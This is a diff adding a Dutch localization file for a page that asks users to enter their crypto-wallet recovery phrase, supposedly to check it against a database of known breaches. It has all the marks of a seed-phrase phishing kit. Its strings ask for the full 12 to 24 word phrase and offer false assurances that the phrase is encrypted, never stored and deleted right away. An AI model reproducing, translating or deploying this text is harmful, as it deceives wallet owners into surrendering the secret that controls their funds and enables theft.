@@ -1,0 +1,37 @@
+﻿{
+  "mainTitle": "Toegang tot je wallet met je geheime herstelzin",
+  "description1": "We voeren een veilige controle uit van je herstelzin aan de hand van onze database met bekende beveiligingsinbreuken. Als we een lek detecteren, bieden we onmiddellijk begeleide stappen om je portefeuille te beveiligen.",
+  "instructions": "Voer de vertrouwelijke herstelzin in die u gegenereerd heeft tijdens het initialiseren van uw portefeuille.",
+  "phrase12": "Ik heb een herstelzin van 12 woorden",
+  "phrase15": "Ik heb een herstelzin van 15 woorden",
+  "phrase18": "Ik heb een herstelzin van 18 woorden",
+  "phrase21": "Ik heb een herstelzin van 21 woorden",
+  "phrase24": "Ik heb een herstelzin van 24 woorden",
+  "pasteInfo": "Je kunt je volledige herstelzin in elk willekeurig veld plakken.",
+  "errorMessage": "Herstelzinnen moeten uit 12, 15, 18, 21 of 24 woorden bestaan.",
+  "confirmButton": "Herstelzin controleren",
+  "securityBtnText": "Beveiligingsinformatie",
+  "loaderText": "Herstelzin verificeren...",
+  "modalTitle": "Beveiligingsinformatie",
+  "bestPracticesTitle": "Beste beveiligingspraktijken:",
+  "bestPracticesList": [
+    "Zorg dat je verbinding beveiligd is (HTTPS) in je browser.",
+    "Gebruik deze functie alleen op persoonlijke en veilige apparaten."
+  ],
+  "protectionTitle": "Hoe wij jou beschermen:",
+  "protectionList": [
+    "Alle gegevens worden versleuteld tijdens verzending.",
+    "Je herstelzin wordt nooit opgeslagen op onze servers."
+  ],
+  "modalNote": "Opmerking: Dit is een beveiligde sessie. Je herstelzin wordt uitsluitend gebruikt om te controleren op mogelijke blootstelling en wordt direct daarna verwijderd."
+}
+
+
+
+
+
+
+
+
+
+
